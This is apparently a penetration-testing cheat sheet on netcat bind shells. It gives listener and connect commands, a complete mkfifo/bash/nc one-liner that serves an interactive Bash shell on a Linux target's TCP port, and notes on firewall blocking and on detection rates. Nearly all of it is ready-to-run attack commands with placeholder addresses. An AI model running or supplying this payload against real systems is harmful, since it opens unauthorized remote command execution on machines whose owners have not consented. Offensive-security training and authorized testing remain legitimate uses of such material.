## TCP Session Establishment

Direct connectivity required between attack box and target where incoming connections are permitted by the network perimeter.

Start listener on target to await connection

```
nc -lvnp <PORT>
```

Connect to target listener from attack box

```
nc -nv <TARGET_IP> <PORT>
```

**Gotchas** **OS firewalls** frequently block incoming traffic even on standard ports, causing connection timeouts.

---

## Interactive Linux Bind Shell

Filesystem and OS interaction required via an established listener on a remote Linux host.

Execute payload on target to bind Bash shell to a TCP listener via named pipe

```
rm -f <FILE_PATH>; mkfifo <FILE_PATH>; cat <FILE_PATH> | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > <FILE_PATH>
```

Connect to the served shell from attack box

```
nc -nv <TARGET_IP> <PORT>
```

**Gotchas** **Inbound connection detection** is significantly higher than reverse shells, as most security controls monitor and block unsolicited incoming traffic.

> ⚠️ Gap: The source provides a shell payload specifically for Linux; executing this against a Windows target will result in a silent failure as `mkfifo` and `/bin/bash` are not native to the Windows environment.